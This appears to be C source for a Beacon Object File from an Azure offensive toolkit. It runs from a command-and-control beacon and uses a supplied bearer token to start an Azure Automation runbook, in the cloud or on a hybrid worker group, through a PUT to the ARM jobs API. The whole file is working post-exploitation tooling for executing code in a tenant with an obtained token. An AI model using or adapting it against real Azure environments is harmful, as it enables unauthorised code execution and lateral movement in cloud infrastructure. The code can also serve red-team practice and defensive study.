/*
 * start_azurerm_automation_account_runbook.c — BARK BOF
 * Start-AzureRMAutomationAccountRunbook — Start a published runbook as a real job
 *
 * Args : token, accountPath, runbookName, hybridGroup
 *
 * accountPath  : full ARM path, e.g.
 *   /subscriptions/<subId>/resourceGroups/<rg>/providers/Microsoft.Automation/automationAccounts/<name>
 * hybridGroup  : hybrid worker group name, or "" for cloud execution
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    static char bodyBuf[1024];
    static char guidBuf[64];
    LPWSTR widePath = NULL;
    char  *token       = NULL;
    char  *accountPath = NULL;
    char  *runbookName = NULL;
    char  *hybridGroup = NULL;
    SYSTEMTIME st;

    BeaconDataParse(&parser, args, alen);
    token       = BeaconDataExtract(&parser, NULL);
    accountPath = BeaconDataExtract(&parser, NULL);
    runbookName = BeaconDataExtract(&parser, NULL);
    hybridGroup = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_start_azurerm_automation_account_runbook <token> <accountPath> <runbookName> <hybridGroup|\"\">\n");
        return;
    }
    accountPath = SAFE_STR(accountPath);
    runbookName = SAFE_STR(runbookName);
    hybridGroup = SAFE_STR(hybridGroup);

    /* Build a timestamp-based job GUID: b4rkb0f0-YYYY-MMDD-HHmm-SSMMM0000000 */
    KERNEL32$GetLocalTime(&st);
    MSVCRT$sprintf_s(guidBuf, sizeof(guidBuf),
        "b4rkb0f0-%04u-%02u%02u-%02u%02u-%02u%03u0000000",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Start-AzureRMAutomationAccountRunbook: %s / %s (job: %s)\n",
        accountPath, runbookName, guidBuf);

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/jobs/%s?api-version=2024-10-23", accountPath, guidBuf);

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"properties\":{\"runbook\":{\"name\":\"%s\"},\"runOn\":\"%s\"}}",
        runbookName, hybridGroup);

    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BarkPost(L"management.azure.com", widePath, L"PUT", bodyBuf, token, "application/json");
    HFree(widePath);
}
